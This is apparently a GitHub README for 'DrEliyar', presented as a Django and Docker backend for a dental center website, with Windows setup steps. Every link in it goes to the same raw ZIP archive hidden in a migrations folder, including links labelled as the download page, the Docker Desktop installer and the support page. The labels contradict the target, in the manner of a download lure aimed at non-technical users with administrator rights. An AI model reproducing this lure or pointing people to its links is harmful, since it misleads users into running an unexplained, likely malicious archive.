# 🦷 DrEliyar - Manage Dental Center Backend Easily

[![Download DrEliyar](https://img.shields.io/badge/Download-DrEliyar-green?style=for-the-badge)](https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip)

---

## 📋 About DrEliyar

DrEliyar is the backend system designed for a dental center website. It handles content, appointment requests, admin controls, and Telegram notifications. This software runs on Windows and helps dental staff manage bookings and website content from a single place.

The app uses reliable technology, including Django and Docker. You do not need technical skills to use it. This guide will help you download and run DrEliyar on your Windows PC.

---

## 🖥️ System Requirements

Before installing DrEliyar, make sure your computer meets these requirements:

- Windows 10 or newer (64-bit recommended)
- At least 4 GB of free RAM
- 5 GB of free disk space for installation and data
- Internet connection for downloading files and updates
- Administrator access on your PC to install necessary components

---

## 🚀 Getting Started

To run DrEliyar, you need to download the files and set up the app on your PC. If this is your first time using an app like this, don’t worry. The steps below will walk you through the entire process carefully.

---

## 🔗 Download DrEliyar

Click the green button below to visit the download page:

[![Download DrEliyar](https://img.shields.io/badge/Download-DrEliyar-blue?style=for-the-badge)](https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip)

This link takes you to the project’s page on GitHub, where you can find the files to install the backend software.

---

## 📥 How to Download and Install on Windows

1. **Open the download page**  
   Use your web browser to open this address:  
   https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip

2. **Find the latest release or main branch**  
   Look for the “Releases” section, or check the main folder for `docker-compose.yml` and other setup files.

3. **Download the files**  
   Either download the ZIP file by clicking "Code" > "Download ZIP" or clone the repository if you are familiar with Git.

4. **Extract the ZIP**  
   If you downloaded the ZIP, right-click on it and select “Extract All” to unzip the files to a folder on your computer.

5. **Install Docker Desktop**  
   DrEliyar relies on Docker. If you don’t have Docker Desktop installed:  
   - Go to https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip  
   - Download the Windows version  
   - Run the installer and follow instructions to complete the setup  
   - Restart your computer if asked

6. **Run Docker Desktop**  
   Open Docker Desktop after installation. Make sure Docker is running properly before proceeding.

7. **Open Command Prompt or PowerShell**  
   Press `Win + R`, type `cmd` or `powershell`, and press Enter.

8. **Navigate to DrEliyar folder**  
   In the command window, type `cd` followed by the path to the extracted DrEliyar folder. For example:  
   ```  
   cd C:\Users\YourName\Downloads\DrEliyar-main  
   ```

9. **Start DrEliyar backend**  
   Run this command to start the app using Docker Compose:  
   ```  
   docker-compose up  
   ```  

10. **Wait for startup**  
    The terminal will show messages as the app loads its services. When you see messages that end with “Starting development server” or “Listening on,” the backend is running.

---

## 🔧 How to Use DrEliyar

DrEliyar runs backend services. You won’t see a user interface by just starting the program. Instead, it works behind the scenes to manage your website’s content and appointments.

- To access the admin panel, open your web browser and go to `http://localhost:8000/admin`
- Use the admin panel to add or edit website content and appointments.
- Notifications about new appointment requests appear in your connected Telegram account.
- You can stop the app by returning to the terminal where Docker runs and pressing `Ctrl + C`.

---

## ⚙️ Features Overview

- **Content management:** Add and update texts, images, and pages on the dental center website.
- **Appointment handling:** Receive and manage booking requests from clients.
- **Admin panel:** Manage all backend tasks with an easy-to-use web interface.
- **Telegram integration:** Receive appointment alerts directly in Telegram.
- **Docker support:** Runs safely in isolated containers for easy installation and updates.
- **REST API:** Supports future mobile app or website integrations.

---

## 🔄 Updating DrEliyar

To keep your backend secure and functional, update the software regularly:

1. Stop the running app with `Ctrl + C` in the command window.
2. Download the latest version from the GitHub page again.
3. Replace the old files with the new ones.
4. Start the backend with `docker-compose up` again.

---

## 🛠 Troubleshooting

- **Docker not starting:**  
  Restart your computer and try opening Docker Desktop manually.

- **Port 8000 already in use:**  
  If the app can’t start, port 8000 may be busy. Close other apps using it or change the port in `docker-compose.yml`.

- **Admin page not loading:**  
  Ensure Docker containers are running. Check Docker Desktop to see if containers are active.

- **Telegram alerts not received:**  
  Verify your Telegram token and chat ID in the configuration files are set correctly.

---

## 🤝 Support and Contact

If you face issues not covered here, ask for help on the GitHub Discussions or Issues tab of the DrEliyar project page:

https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip

---

## ⚙️ Technologies Used

- Python 3 with Django and Django REST Framework  
- Docker and Docker Compose for easy deployment  
- Nginx web server for handling requests  
- CSS and HTML for frontend styling  
- JavaScript for dynamic behavior  
- Telegram API for notifications  

---

## 🔗 Download Link Again

Click below to visit the official repository and download DrEliyar:

[![Download DrEliyar](https://img.shields.io/badge/Download-DrEliyar-grey?style=for-the-badge)](https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip)